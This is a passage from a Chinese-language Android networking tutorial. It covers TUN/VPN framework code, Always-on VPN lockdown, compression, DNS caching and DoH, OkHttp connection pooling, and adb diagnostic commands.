    <span class="hljs-built_in">strncpy</span>(ifr.ifr_name, <span class="hljs-string">"tun%d"</span>, IFNAMSIZ);

    <span class="hljs-comment">// 3. 创建TUN接口</span>
    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">ioctl</span>(tun, TUNSETIFF, &amp;ifr) &lt; <span class="hljs-number">0</span>) {
        <span class="hljs-built_in">close</span>(tun);
        <span class="hljs-built_in">jniThrowException</span>(env, <span class="hljs-string">"java/io/IOException"</span>,
                         <span class="hljs-string">"Cannot configure TUN device"</span>);
        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;
    }

    <span class="hljs-comment">// 4. 设置MTU</span>
    <span class="hljs-keyword">if</span> (mtu &gt; <span class="hljs-number">0</span> &amp;&amp; mtu != ifr.ifr_mtu) {
        ifr.ifr_mtu = mtu;
        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">ioctl</span>(tun, SIOCSIFMTU, &amp;ifr) &lt; <span class="hljs-number">0</span>) {
            <span class="hljs-built_in">ALOGW</span>(<span class="hljs-string">"Cannot set MTU"</span>);
        }
    }

    <span class="hljs-keyword">return</span> tun;
}

<span class="hljs-comment">// 添加IP地址到TUN接口</span>
<span class="hljs-function"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title">com_android_server_connectivity_Vpn_jniAddAddress</span><span class="hljs-params">(
        JNIEnv* env, jobject <span class="hljs-comment">/* clazz */</span>,
        jstring jInterfaceName, jstring jAddress, jint prefixLen)</span> </span>{

    <span class="hljs-type">const</span> <span class="hljs-type">char</span>* interfaceName = env-&gt;<span class="hljs-built_in">GetStringUTFChars</span>(jInterfaceName, <span class="hljs-literal">NULL</span>);
    <span class="hljs-type">const</span> <span class="hljs-type">char</span>* address = env-&gt;<span class="hljs-built_in">GetStringUTFChars</span>(jAddress, <span class="hljs-literal">NULL</span>);

    <span class="hljs-comment">// 使用netlink添加地址</span>
    <span class="hljs-keyword">struct</span> {
        <span class="hljs-keyword">struct</span> <span class="hljs-title class_">nlmsghdr</span> n;
        <span class="hljs-keyword">struct</span> <span class="hljs-title class_">ifaddrmsg</span> ifa;
        <span class="hljs-type">char</span> buf[<span class="hljs-number">256</span>];
    } req;

    <span class="hljs-built_in">memset</span>(&amp;req, <span class="hljs-number">0</span>, <span class="hljs-built_in">sizeof</span>(req));
    req.n.nlmsg_len = <span class="hljs-built_in">NLMSG_LENGTH</span>(<span class="hljs-built_in">sizeof</span>(<span class="hljs-keyword">struct</span> ifaddrmsg));
    req.n.nlmsg_type = RTM_NEWADDR;
    req.n.nlmsg_flags = NLM_F_REQUEST | NLM_F_CREATE | NLM_F_EXCL;

    req.ifa.ifa_family = AF_INET;  <span class="hljs-comment">// 或AF_INET6</span>
    req.ifa.ifa_prefixlen = prefixLen;
    req.ifa.ifa_index = if_nametoindex(interfaceName);

    <span class="hljs-comment">// 添加地址属性...</span>
    <span class="hljs-built_in">addattr_l</span>(&amp;req.n, <span class="hljs-built_in">sizeof</span>(req), IFA_LOCAL, address, <span class="hljs-number">4</span>);

    <span class="hljs-comment">// 发送到内核...</span>
    <span class="hljs-built_in">send_netlink_message</span>(&amp;req.n);

    env-&gt;<span class="hljs-built_in">ReleaseStringUTFChars</span>(jInterfaceName, interfaceName);
    env-&gt;<span class="hljs-built_in">ReleaseStringUTFChars</span>(jAddress, address);
}
</code></pre>
<h3 data-id="heading-29">2.4 Always-on VPN</h3>
<p><strong>Always-on VPN</strong>是Android 7.0引入的功能，确保设备始终通过VPN连接。</p>
<h4 data-id="heading-30">工作机制</h4>
<pre><code class="hljs language-markdown" lang="markdown">Always-on VPN开启后:

<span class="hljs-bullet">1.</span> 系统启动时自动启动VPN
   → 无需用户手动连接

<span class="hljs-bullet">2.</span> VPN断开时阻止所有网络访问
   → "Block connections without VPN"选项

<span class="hljs-bullet">3.</span> VPN服务崩溃时自动重连
   → 由系统监控并重启

<span class="hljs-bullet">4.</span> 不允许用户手动断开
   → 只有管理员可以关闭
</code></pre>
<h4 data-id="heading-31">配置Always-on VPN</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 系统设置 - 配置Always-on VPN</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AlwaysOnVpnConfig</span> {

    <span class="hljs-comment">// 设置Always-on VPN</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setAlwaysOnVpn</span><span class="hljs-params">(Context context, String packageName,
                               <span class="hljs-type">boolean</span> lockdownEnabled)</span> {
        <span class="hljs-type">ConnectivityManager</span> <span class="hljs-variable">cm</span> <span class="hljs-operator">=</span> context.getSystemService(
            ConnectivityManager.class);

        <span class="hljs-comment">// 需要CONTROL_ALWAYS_ON_VPN权限 (系统应用)</span>
        cm.setAlwaysOnVpnPackageForUser(
            UserHandle.myUserId(),
            packageName,
            lockdownEnabled,    <span class="hljs-comment">// 是否阻断模式</span>
            <span class="hljs-literal">null</span>                <span class="hljs-comment">// 允许绕过的应用列表</span>
        );
    }

    <span class="hljs-comment">// 检查Always-on VPN状态</span>
    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">isAlwaysOnVpnEnabled</span><span class="hljs-params">(Context context)</span> {
        <span class="hljs-type">ConnectivityManager</span> <span class="hljs-variable">cm</span> <span class="hljs-operator">=</span> context.getSystemService(
            ConnectivityManager.class);

        <span class="hljs-type">String</span> <span class="hljs-variable">vpnPackage</span> <span class="hljs-operator">=</span> cm.getAlwaysOnVpnPackageForUser(
            UserHandle.myUserId()
        );

        <span class="hljs-keyword">return</span> vpnPackage != <span class="hljs-literal">null</span>;
    }
}
</code></pre>
<h4 data-id="heading-32">Framework实现</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// Vpn.java</span>
<span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">setAlwaysOnPackage</span><span class="hljs-params">(String packageName, <span class="hljs-type">boolean</span> lockdown,
                                  List&lt;String&gt; lockdownWhitelist)</span> {
    enforceControlPermissionOrInternalCaller();

    <span class="hljs-keyword">if</span> (packageName == <span class="hljs-literal">null</span>) {
        <span class="hljs-comment">// 关闭Always-on VPN</span>
        mAlwaysOn = <span class="hljs-literal">false</span>;
        mLockdown = <span class="hljs-literal">false</span>;
        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
    }

    <span class="hljs-comment">// 验证VPN应用</span>
    <span class="hljs-keyword">if</span> (!isVpnServicePreConsented(packageName)) {
        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
    }

    <span class="hljs-comment">// 保存配置</span>
    mAlwaysOn = <span class="hljs-literal">true</span>;
    mLockdown = lockdown;
    mLockdownWhitelist = lockdownWhitelist;

    <span class="hljs-comment">// 启动VPN</span>
    startAlwaysOnVpn();

    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
}

<span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">startAlwaysOnVpn</span><span class="hljs-params">()</span> {
    <span class="hljs-comment">// 1. 如果已连接，什么都不做</span>
    <span class="hljs-keyword">if</span> (mNetworkAgent != <span class="hljs-literal">null</span> &amp;&amp; mNetworkAgent.isConnected()) {
        <span class="hljs-keyword">return</span>;
    }

    <span class="hljs-comment">// 2. 启动VPN服务</span>
    <span class="hljs-type">Intent</span> <span class="hljs-variable">intent</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Intent</span>(VpnConfig.SERVICE_INTERFACE);
    intent.setPackage(mPackage);
    intent.setComponent(mPackage, mService);

    <span class="hljs-keyword">try</span> {
        mContext.startServiceAsUser(intent, UserHandle.of(mUserHandle));
    } <span class="hljs-keyword">catch</span> (RuntimeException e) {
        Log.e(TAG, <span class="hljs-string">"Failed to start Always-on VPN"</span>, e);
    }

    <span class="hljs-comment">// 3. 如果是锁定模式，配置防火墙</span>
    <span class="hljs-keyword">if</span> (mLockdown) {
        setVpnForcedLocked(<span class="hljs-literal">true</span>);
    }
}

<span class="hljs-comment">// 锁定模式：阻止所有非VPN流量</span>
<span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setVpnForcedLocked</span><span class="hljs-params">(<span class="hljs-type">boolean</span> enforce)</span> {
    <span class="hljs-keyword">if</span> (enforce) {
        <span class="hljs-comment">// 添加防火墙规则：拒绝所有UID的网络访问</span>
        <span class="hljs-comment">// 除了VPN应用和白名单应用</span>
        mNetd.firewallSetUidRule(FIREWALL_CHAIN_VPN, UID_ALL, DENY);

        <span class="hljs-comment">// 允许VPN应用</span>
        mNetd.firewallSetUidRule(FIREWALL_CHAIN_VPN,
                                mOwnerUID, ALLOW);

        <span class="hljs-comment">// 允许白名单应用</span>
        <span class="hljs-keyword">for</span> (String pkg : mLockdownWhitelist) {
            <span class="hljs-type">int</span> <span class="hljs-variable">uid</span> <span class="hljs-operator">=</span> getUidForPackage(pkg);
            mNetd.firewallSetUidRule(FIREWALL_CHAIN_VPN, uid, ALLOW);
        }
    } <span class="hljs-keyword">else</span> {
        <span class="hljs-comment">// 移除防火墙规则</span>
        mNetd.firewallSetUidRule(FIREWALL_CHAIN_VPN, UID_ALL, ALLOW);
    }
}
</code></pre>
<hr/>
<h2 data-id="heading-33">三、网络性能优化实战</h2>
<h3 data-id="heading-34">3.1 流量优化技巧</h3>
<h4 data-id="heading-35">1. 压缩传输</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">NetworkOptimization</span> {

    <span class="hljs-comment">// 使用GZIP压缩HTTP请求体</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">sendCompressedRequest</span><span class="hljs-params">(String url, String data)</span>
            <span class="hljs-keyword">throws</span> IOException {
        <span class="hljs-type">HttpURLConnection</span> <span class="hljs-variable">conn</span> <span class="hljs-operator">=</span> (HttpURLConnection)
            <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(url).openConnection();

        conn.setRequestMethod(<span class="hljs-string">"POST"</span>);
        conn.setDoOutput(<span class="hljs-literal">true</span>);
        conn.setRequestProperty(<span class="hljs-string">"Content-Encoding"</span>, <span class="hljs-string">"gzip"</span>);

        <span class="hljs-comment">// GZIP压缩</span>
        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();
        <span class="hljs-keyword">try</span> (<span class="hljs-type">GZIPOutputStream</span> <span class="hljs-variable">gzos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">GZIPOutputStream</span>(baos)) {
            gzos.write(data.getBytes(StandardCharsets.UTF_8));
        }
        <span class="hljs-type">byte</span>[] compressed = baos.toByteArray();

        <span class="hljs-comment">// 发送压缩数据</span>
        <span class="hljs-keyword">try</span> (<span class="hljs-type">OutputStream</span> <span class="hljs-variable">os</span> <span class="hljs-operator">=</span> conn.getOutputStream()) {
            os.write(compressed);
        }

        <span class="hljs-comment">// 日志压缩比</span>
        Log.d(TAG, String.format(<span class="hljs-string">"Compression ratio: %.2f%%"</span>,
            <span class="hljs-number">100.0</span> * compressed.length / data.length()));
    }

    <span class="hljs-comment">// 使用Brotli压缩 (更高压缩率)</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">sendBrotliRequest</span><span class="hljs-params">(String url, <span class="hljs-type">byte</span>[] data)</span>
            <span class="hljs-keyword">throws</span> IOException {
        <span class="hljs-comment">// Brotli库: com.aayushatharva.brotli4j:brotli4j</span>

        <span class="hljs-type">BrotliCompressor</span> <span class="hljs-variable">compressor</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BrotliCompressor</span>();
        <span class="hljs-type">byte</span>[] compressed = compressor.compress(data,
            Brotli.DEFAULT_QUALITY, Brotli.DEFAULT_WINDOW);

        <span class="hljs-type">HttpURLConnection</span> <span class="hljs-variable">conn</span> <span class="hljs-operator">=</span> (HttpURLConnection)
            <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(url).openConnection();
        conn.setRequestProperty(<span class="hljs-string">"Content-Encoding"</span>, <span class="hljs-string">"br"</span>);

        <span class="hljs-comment">// 发送...</span>
    }
}
</code></pre>
<h4 data-id="heading-36">2. 图片优化</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ImageOptimization</span> {

    <span class="hljs-comment">// 根据网络状态调整图片质量</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">loadOptimizedImage</span><span class="hljs-params">(Context context, String url,
                                   ImageView imageView)</span> {
        <span class="hljs-comment">// 1. 检查网络类型</span>
        <span class="hljs-type">boolean</span> <span class="hljs-variable">isMetered</span> <span class="hljs-operator">=</span> isCurrentNetworkMetered(context);
        <span class="hljs-type">boolean</span> <span class="hljs-variable">isSlowNetwork</span> <span class="hljs-operator">=</span> isSlowNetwork(context);

        <span class="hljs-comment">// 2. 选择质量</span>
        String imageUrl;
        <span class="hljs-keyword">if</span> (isSlowNetwork || isMetered) {
            <span class="hljs-comment">// 慢速/计费网络：低质量图片</span>
            imageUrl = url + <span class="hljs-string">"?quality=low&amp;size=small"</span>;
        } <span class="hljs-keyword">else</span> {
            <span class="hljs-comment">// 快速/非计费网络：高质量图片</span>
            imageUrl = url + <span class="hljs-string">"?quality=high&amp;size=large"</span>;
        }

        <span class="hljs-comment">// 3. 加载图片 (使用Glide/Coil等库)</span>
        Glide.with(context)
            .load(imageUrl)
            .diskCacheStrategy(DiskCacheStrategy.AUTOMATIC)
            .into(imageView);
    }

    <span class="hljs-comment">// 判断是否慢速网络</span>
    <span class="hljs-keyword">private</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">isSlowNetwork</span><span class="hljs-params">(Context context)</span> {
        <span class="hljs-type">ConnectivityManager</span> <span class="hljs-variable">cm</span> <span class="hljs-operator">=</span> context.getSystemService(
            ConnectivityManager.class);

        <span class="hljs-type">NetworkCapabilities</span> <span class="hljs-variable">caps</span> <span class="hljs-operator">=</span> cm.getNetworkCapabilities(
            cm.getActiveNetwork());

        <span class="hljs-keyword">if</span> (caps == <span class="hljs-literal">null</span>) <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;

        <span class="hljs-comment">// 下行带宽 &lt; 1Mbps 视为慢速</span>
        <span class="hljs-type">int</span> <span class="hljs-variable">downBandwidth</span> <span class="hljs-operator">=</span> caps.getLinkDownstreamBandwidthKbps();
        <span class="hljs-keyword">return</span> downBandwidth &lt; <span class="hljs-number">1000</span>;
    }
}
</code></pre>
<h4 data-id="heading-37">3. 预取策略</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">PrefetchStrategy</span> {

    <span class="hljs-comment">// 智能预取</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">smartPrefetch</span><span class="hljs-params">(Context context)</span> {
        <span class="hljs-comment">// 仅在WiFi + 充电时预取</span>
        <span class="hljs-keyword">if</span> (isWifiConnected(context) &amp;&amp; isCharging(context)) {
            <span class="hljs-comment">// 预取下一章节内容</span>
            prefetchNextChapter();

            <span class="hljs-comment">// 预加载推荐列表</span>
            prefetchRecommendations();

            <span class="hljs-comment">// 同步离线数据</span>
            syncOfflineData();
        }
    }

    <span class="hljs-keyword">private</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">isWifiConnected</span><span class="hljs-params">(Context context)</span> {
        <span class="hljs-type">ConnectivityManager</span> <span class="hljs-variable">cm</span> <span class="hljs-operator">=</span> context.getSystemService(
            ConnectivityManager.class);

        <span class="hljs-type">NetworkCapabilities</span> <span class="hljs-variable">caps</span> <span class="hljs-operator">=</span> cm.getNetworkCapabilities(
            cm.getActiveNetwork());

        <span class="hljs-keyword">return</span> caps != <span class="hljs-literal">null</span> &amp;&amp;
               caps.hasTransport(TRANSPORT_WIFI) &amp;&amp;
               caps.hasCapability(NET_CAPABILITY_NOT_METERED);
    }

    <span class="hljs-keyword">private</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">isCharging</span><span class="hljs-params">(Context context)</span> {
        <span class="hljs-type">BatteryManager</span> <span class="hljs-variable">bm</span> <span class="hljs-operator">=</span> context.getSystemService(
            BatteryManager.class);

        <span class="hljs-keyword">return</span> bm.isCharging();
    }
}
</code></pre>
<h3 data-id="heading-38">3.2 DNS优化</h3>
<h4 data-id="heading-39">1. DNS缓存</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DnsCache</span> {

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Map&lt;String, InetAddress[]&gt; mCache =
        <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConcurrentHashMap</span>&lt;&gt;();

    <span class="hljs-comment">// DNS查询带缓存</span>
    <span class="hljs-keyword">public</span> InetAddress[] lookup(String hostname) <span class="hljs-keyword">throws</span> UnknownHostException {
        <span class="hljs-comment">// 1. 检查缓存</span>
        InetAddress[] cached = mCache.get(hostname);
        <span class="hljs-keyword">if</span> (cached != <span class="hljs-literal">null</span> &amp;&amp; !isExpired(cached)) {
            <span class="hljs-keyword">return</span> cached;
        }

        <span class="hljs-comment">// 2. DNS查询</span>
        InetAddress[] addresses = InetAddress.getAllByName(hostname);

        <span class="hljs-comment">// 3. 缓存结果 (TTL 5分钟)</span>
        mCache.put(hostname, addresses);
        scheduleExpiry(hostname, <span class="hljs-number">5</span> * <span class="hljs-number">60</span> * <span class="hljs-number">1000</span>);

        <span class="hljs-keyword">return</span> addresses;
    }

    <span class="hljs-comment">// 预热DNS缓存</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">warmUpCache</span><span class="hljs-params">(String... hostnames)</span> {
        <span class="hljs-type">ExecutorService</span> <span class="hljs-variable">executor</span> <span class="hljs-operator">=</span> Executors.newFixedThreadPool(<span class="hljs-number">4</span>);

        <span class="hljs-keyword">for</span> (String hostname : hostnames) {
            executor.submit(() -&gt; {
                <span class="hljs-keyword">try</span> {
                    lookup(hostname);
                } <span class="hljs-keyword">catch</span> (UnknownHostException e) {
                    <span class="hljs-comment">// Ignore</span>
                }
            });
        }
    }
}
</code></pre>
<h4 data-id="heading-40">2. DoH (DNS over HTTPS)</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DohResolver</span> {

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">DOH_SERVER</span> <span class="hljs-operator">=</span>
        <span class="hljs-string">"https://dns.google/dns-query"</span>;

    <span class="hljs-comment">// 使用DoH查询DNS</span>
    <span class="hljs-keyword">public</span> List&lt;InetAddress&gt; <span class="hljs-title function_">resolveDoH</span><span class="hljs-params">(String hostname)</span>
            <span class="hljs-keyword">throws</span> IOException {
        <span class="hljs-comment">// 1. 构建DoH请求</span>
        <span class="hljs-type">String</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> DOH_SERVER + <span class="hljs-string">"?name="</span> + hostname + <span class="hljs-string">"&amp;type=A"</span>;

        <span class="hljs-type">HttpsURLConnection</span> <span class="hljs-variable">conn</span> <span class="hljs-operator">=</span> (HttpsURLConnection)
            <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(url).openConnection();
        conn.setRequestProperty(<span class="hljs-string">"Accept"</span>, <span class="hljs-string">"application/dns-json"</span>);

        <span class="hljs-comment">// 2. 发送请求</span>
        <span class="hljs-type">int</span> <span class="hljs-variable">responseCode</span> <span class="hljs-operator">=</span> conn.getResponseCode();
        <span class="hljs-keyword">if</span> (responseCode != <span class="hljs-number">200</span>) {
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IOException</span>(<span class="hljs-string">"DoH query failed: "</span> + responseCode);
        }

        <span class="hljs-comment">// 3. 解析JSON响应</span>
        <span class="hljs-type">String</span> <span class="hljs-variable">response</span> <span class="hljs-operator">=</span> readStream(conn.getInputStream());
        <span class="hljs-type">JSONObject</span> <span class="hljs-variable">json</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONObject</span>(response);

        <span class="hljs-type">JSONArray</span> <span class="hljs-variable">answers</span> <span class="hljs-operator">=</span> json.getJSONArray(<span class="hljs-string">"Answer"</span>);
        List&lt;InetAddress&gt; addresses = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();

        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; answers.length(); i++) {
            <span class="hljs-type">JSONObject</span> <span class="hljs-variable">answer</span> <span class="hljs-operator">=</span> answers.getJSONObject(i);
            <span class="hljs-type">String</span> <span class="hljs-variable">ip</span> <span class="hljs-operator">=</span> answer.getString(<span class="hljs-string">"data"</span>);
            addresses.add(InetAddress.getByName(ip));
        }

        <span class="hljs-keyword">return</span> addresses;
    }
}
</code></pre>
<h3 data-id="heading-41">3.3 连接池管理</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ConnectionPoolOptimization</span> {

    <span class="hljs-comment">// OkHttp连接池配置</span>
    <span class="hljs-keyword">public</span> OkHttpClient <span class="hljs-title function_">createOptimizedClient</span><span class="hljs-params">()</span> {
        <span class="hljs-comment">// 1. 配置连接池</span>
        <span class="hljs-type">ConnectionPool</span> <span class="hljs-variable">connectionPool</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConnectionPool</span>(
            <span class="hljs-number">10</span>,              <span class="hljs-comment">// 最大空闲连接数</span>
            <span class="hljs-number">5</span>,               <span class="hljs-comment">// 连接保活时间</span>
            TimeUnit.MINUTES
        );

        <span class="hljs-comment">// 2. 配置超时</span>
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">OkHttpClient</span>.Builder()
            .connectionPool(connectionPool)
            .connectTimeout(<span class="hljs-number">10</span>, TimeUnit.SECONDS)
            .readTimeout(<span class="hljs-number">30</span>, TimeUnit.SECONDS)
            .writeTimeout(<span class="hljs-number">30</span>, TimeUnit.SECONDS)

            <span class="hljs-comment">// 3. 启用HTTP/2</span>
            .protocols(Arrays.asList(Protocol.HTTP_2, Protocol.HTTP_1_1))

            <span class="hljs-comment">// 4. 配置重试</span>
            .retryOnConnectionFailure(<span class="hljs-literal">true</span>)

            <span class="hljs-comment">// 5. 添加拦截器</span>
            .addInterceptor(<span class="hljs-keyword">new</span> <span class="hljs-title class_">LoggingInterceptor</span>())
            .addNetworkInterceptor(<span class="hljs-keyword">new</span> <span class="hljs-title class_">CacheInterceptor</span>())

            .build();
    }

    <span class="hljs-comment">// 自定义缓存拦截器</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CacheInterceptor</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Interceptor</span> {
        <span class="hljs-meta">@Override</span>
        <span class="hljs-keyword">public</span> Response <span class="hljs-title function_">intercept</span><span class="hljs-params">(Chain chain)</span> <span class="hljs-keyword">throws</span> IOException {
            <span class="hljs-type">Request</span> <span class="hljs-variable">request</span> <span class="hljs-operator">=</span> chain.request();

            <span class="hljs-comment">// 离线时使用缓存</span>
            <span class="hljs-keyword">if</span> (!isNetworkAvailable()) {
                request = request.newBuilder()
                    .cacheControl(CacheControl.FORCE_CACHE)
                    .build();
            }

            <span class="hljs-type">Response</span> <span class="hljs-variable">response</span> <span class="hljs-operator">=</span> chain.proceed(request);

            <span class="hljs-comment">// 自定义缓存策略</span>
            <span class="hljs-keyword">if</span> (isNetworkAvailable()) {
                <span class="hljs-comment">// 在线：缓存1小时</span>
                response = response.newBuilder()
                    .header(<span class="hljs-string">"Cache-Control"</span>,
                           <span class="hljs-string">"public, max-age="</span> + <span class="hljs-number">60</span> * <span class="hljs-number">60</span>)
                    .build();
            } <span class="hljs-keyword">else</span> {
                <span class="hljs-comment">// 离线：缓存4周</span>
                response = response.newBuilder()
                    .header(<span class="hljs-string">"Cache-Control"</span>,
                           <span class="hljs-string">"public, only-if-cached, max-stale="</span> + <span class="hljs-number">60</span> * <span class="hljs-number">60</span> * <span class="hljs-number">24</span> * <span class="hljs-number">28</span>)
                    .build();
            }

            <span class="hljs-keyword">return</span> response;
        }
    }
}
</code></pre>
<h3 data-id="heading-42">3.4 网络诊断工具</h3>
<h4 data-id="heading-43">1. 网络质量监测</h4>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 检查网络连接状态</span>
adb shell dumpsys connectivity | grep <span class="hljs-string">"Active networks"</span>

<span class="hljs-comment"># 检查DNS配置</span>
adb shell getprop net.dns1
adb shell getprop net.dns2

<span class="hljs-comment"># 测试网络延迟</span>
adb shell ping -c 4 8.8.8.8

<span class="hljs-comment"># 测试DNS解析</span>
adb shell nslookup www.google.com

<span class="hljs-comment"># 检查路由表</span>
adb shell ip route show

<span class="hljs-comment"># 查看接口统计</span>
adb shell ifconfig wlan0

<span class="hljs-comment"># 抓取网络数据包</span>
adb shell tcpdump -i wlan0 -w /sdcard/capture.pcap

<span class="hljs-comment"># 查看iptables规则</span>
adb shell iptables -L -n -v

<span class="hljs-comment"># 查看eBPF统计 (Android 15)</span>
adb shell dumpsys connectivity trafficcontroller
</code></pre>
<h4 data-id="heading-44">2. 流量监控</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TrafficMonitor</span> {

    <span class="hljs-keyword">private</span> <span class="hljs-type">long</span> <span class="hljs-variable">mLastRxBytes</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;
    <span class="hljs-keyword">private</span> <span class="hljs-type">long</span> <span class="hljs-variable">mLastTxBytes</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;
    <span class="hljs-keyword">private</span> <span class="hljs-type">long</span> <span class="hljs-variable">mLastTime</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;

    <span class="hljs-comment">// 计算实时网速</span>
    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getCurrentNetworkSpeed</span><span class="hljs-params">(<span class="hljs-type">int</span> uid)</span> {
        <span class="hljs-type">long</span> <span class="hljs-variable">currentTime</span> <span class="hljs-operator">=</span> System.currentTimeMillis();
        <span class="hljs-type">long</span> <span class="hljs-variable">currentRx</span> <span class="hljs-operator">=</span> TrafficStats.getUidRxBytes(uid);
        <span class="hljs-type">long</span> <span class="hljs-variable">currentTx</span> <span class="hljs-operator">=</span> TrafficStats.getUidTxBytes(uid);

        <span class="hljs-keyword">if</span> (mLastTime == <span class="hljs-number">0</span>) {
            <span class="hljs-comment">// 首次调用，初始化</span>
            mLastRxBytes = currentRx;
            mLastTxBytes = currentTx;
            mLastTime = currentTime;
            <span class="hljs-keyword">return</span> <span class="hljs-string">"0 KB/s"</span>;
        }

        <span class="hljs-comment">// 计算时间间隔</span>
        <span class="hljs-type">long</span> <span class="hljs-variable">timeDelta</span> <span class="hljs-operator">=</span> currentTime - mLastTime;
        <span class="hljs-keyword">if</span> (timeDelta == <span class="hljs-number">0</span>) <span class="hljs-keyword">return</span> <span class="hljs-string">"0 KB/s"</span>;

        <span class="hljs-comment">// 计算流量增量</span>
        <span class="hljs-type">long</span> <span class="hljs-variable">rxDelta</span> <span class="hljs-operator">=</span> currentRx - mLastRxBytes;
        <span class="hljs-type">long</span> <span class="hljs-variable">txDelta</span> <span class="hljs-operator">=</span> currentTx - mLastTxBytes;

        <span class="hljs-comment">// 计算速度 (字节/秒)</span>
        <span class="hljs-type">long</span> <span class="hljs-variable">rxSpeed</span> <span class="hljs-operator">=</span> rxDelta * <span class="hljs-number">1000</span> / timeDelta;
        <span class="hljs-type">long</span> <span class="hljs-variable">txSpeed</span> <span class="hljs-operator">=</span> txDelta * <span class="hljs-number">1000</span> / timeDelta;

        <span class="hljs-comment">// 更新记录</span>
        mLastRxBytes = currentRx;
        mLastTxBytes = currentTx;
        mLastTime = currentTime;

        <span class="hljs-keyword">return</span> String.format(<span class="hljs-string">"↓ %s/s ↑ %s/s"</span>,
            formatBytes(rxSpeed),
            formatBytes(txSpeed));
    }

    <span class="hljs-keyword">private</span> String <span class="hljs-title function_">formatBytes</span><span class="hljs-params">(<span class="hljs-type">long</span> bytes)</span> {
        <span class="hljs-keyword">if</span> (bytes &lt; <span class="hljs-number">1024</span>) <span class="hljs-keyword">return</span> bytes + <span class="hljs-string">" B"</span>;
        <span class="hljs-keyword">if</span> (bytes &lt; <span class="hljs-number">1024</span> * <span class="hljs-number">1024</span>) <span class="hljs-keyword">return</span> (bytes / <span class="hljs-number">1024</span>) + <span class="hljs-string">" KB"</span>;
        <span class="hljs-keyword">return</span> String.format(<span class="hljs-string">"%.2f MB"</span>, bytes / <span class="hljs-number">1024.0</span> / <span class="hljs-number">1024.0</span>);
    }
}
</code></pre>
<hr/>
<h2 data-id="heading-45">四、Android 15新特性</h2>
<h3 data-id="heading-46">4.1 网络切片支持（Network Slicing）</h3>
<p>5G网络切片允许为不同业务提供差异化的网络服务。</p>
